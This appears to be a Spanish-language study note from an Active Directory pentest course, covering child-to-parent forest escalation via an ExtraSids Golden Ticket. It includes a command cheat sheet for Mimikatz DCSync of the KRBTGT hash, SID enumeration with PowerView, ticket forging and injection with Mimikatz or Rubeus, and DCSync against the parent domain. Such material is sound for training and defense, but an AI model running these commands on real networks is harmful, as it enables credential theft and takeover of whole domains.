---
tags:
  - AD
  - windows
  - attack
---

## Conceptos Clave

* El atributo `sidHistory` permite a los usuarios mantener el acceso a recursos de su dominio original tras una migración.
* Dentro de un mismo bosque de Active Directory, no existe la protección de "SID Filtering" entre dominios, por lo que el atributo `sidHistory` es respetado a través de las confianzas (trusts).
* Si se compromete un dominio hijo, es posible inyectar el SID del grupo "Enterprise Admins" (que reside en el dominio padre) en el `sidHistory` de una cuenta controlada, otorgando acceso administrativo total sobre todo el bosque.
* El ataque consiste en falsificar un Golden Ticket desde el dominio hijo comprometiendo previamente su cuenta KRBTGT, para luego escalar privilegios hacia el dominio padre.
  
## Herramientas Clave

* **Mimikatz:** Utilizado para extraer el hash de la cuenta KRBTGT (DCSync) y para forjar e inyectar el Golden Ticket en memoria (Pass-The-Ticket) con el historial de SIDs modificado.
* **Rubeus:** Alternativa a Mimikatz para forjar e inyectar el Golden Ticket en memoria.
* **PowerView:** Utilizado para enumerar el SID del dominio hijo y el SID del grupo objetivo (Enterprise Admins) en el dominio padre.
* **Módulo ActiveDirectory:** Alternativa nativa para enumerar grupos mediante `Get-ADGroup`.

## Metodología Paso a Paso

1. **Compromiso Inicial del Dominio Hijo:** Se requiere acceso previo con privilegios suficientes (ej. Domain Admin) en el dominio hijo para poder extraer credenciales críticas.
2. **Extracción del hash KRBTGT:** Se realiza un ataque DCSync para obtener el hash NT de la cuenta KRBTGT del dominio hijo, la cual es responsable de firmar todos los tickets Kerberos.
3. **Enumeración de SIDs:** Se debe recolectar el SID del dominio hijo y el SID del grupo "Enterprise Admins" del dominio padre.
4. **Forjado del Golden Ticket (ExtraSids):** Se utiliza el hash KRBTGT del dominio hijo para crear un ticket de concesión de tickets (TGT) a nombre de un usuario (real o inventado). A este ticket se le añade el SID de "Enterprise Admins" en el campo de Extra SIDs / sidHistory.
5. **Inyección y Ejecución:** El ticket forjado se inyecta en la sesión actual (Pass-The-Ticket), otorgando permisos inmediatos sobre los recursos del dominio padre para lograr persistencia o comprometer el Domain Controller principal.

## Cheat Sheet de Comandos
```powershell
# Extraer el hash NT de la cuenta KRBTGT del dominio hijo mediante DCSync con Mimikatz

mimikatz # lsadump::dcsync /user:LOGISTICS.INLANEFREIGHT.LOCAL\krbtgt
```

```powershell
# Obtener el SID del dominio hijo actual usando PowerView

Get-DomainSID
```

```powershell
# Obtener el SID del grupo "Enterprise Admins" del dominio padre usando PowerView

Get-DomainGroup -Domain <PARENT_DOMAIN_FQDN> -Identity "Enterprise Admins" | select distinguishedname,objectsid
```

```powershell
# Alternativa: Obtener el SID de "Enterprise Admins" usando el módulo ActiveDirectory

Get-ADGroup -Identity "Enterprise Admins" -Server "<PARENT_DOMAIN_FQDN>"
```

```powershell
# Forjar e inyectar el Golden Ticket (ExtraSids) usando Mimikatz
# /user: Usuario a suplantar (puede ser inventado)
# /domain: FQDN del dominio hijo comprometido
# /sid: SID del dominio hijo
# /krbtgt: Hash NT de la cuenta krbtgt del dominio hijo
# /sids: SID del grupo Enterprise Admins del dominio padre
# /ptt: Inyecta el ticket directamente en memoria (Pass-The-Ticket)

mimikatz # kerberos::golden /user:<FAKE_USER> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<CHILD_KRBTGT_HASH> /sids:<PARENT_ENTERPRISE_ADMINS_SID> /ptt
```

```powershell
# Alternativa: Forjar e inyectar el Golden Ticket usando Rubeus
# /rc4: Hash NT de la cuenta krbtgt del dominio hijo

.\Rubeus.exe golden /rc4:<CHILD_KRBTGT_HASH> /domain:<CHILD_DOMAIN_FQDN> /sid:<CHILD_DOMAIN_SID> /sids:<PARENT_ENTERPRISE_ADMINS_SID> /user:<FAKE_USER> /ptt
```

```powershell
# Verificar que el ticket Kerberos se ha cargado correctamente en memoria

klist
```

```powershell
# Validar el acceso listando el disco C$ del Domain Controller del dominio padre

ls \\<PARENT_DC_FQDN>\c$
```

```powershell
# Ejecutar un ataque DCSync contra el dominio padre tras cargar el Golden Ticket
# Es fundamental especificar el flag /domain cuando el objetivo no es el dominio actual del usuario

mimikatz # lsadump::dcsync /user:<PARENT_DOMAIN>\<TARGET_USER> /domain:<PARENT_DOMAIN_FQDN>
```

## "Gotchas" y Troubleshooting

* **Requisito del usuario objetivo:** El usuario especificado para crear el Golden Ticket (`/user`) no necesita existir físicamente en el Active Directory del dominio hijo.

* **Especificar el dominio en DCSync:** Al realizar un ataque DCSync contra el dominio padre desde el dominio hijo, el comando fallará si no se especifica explícitamente el parámetro `/domain:<PARENT_DOMAIN_FQDN>`.

* **Invalidación de Tickets:** La única forma de invalidar un Golden Ticket forjado es cambiando la contraseña de la cuenta KRBTGT, idealmente dos veces para limpiar el historial de contraseñas.

* **SID Filtering:** Este ataque solo funciona hacia el dominio padre porque dentro del mismo bosque no existe "SID Filtering". Si intentas esto a través de un trust externo hacia otro bosque, la solicitud de autenticación será filtrada.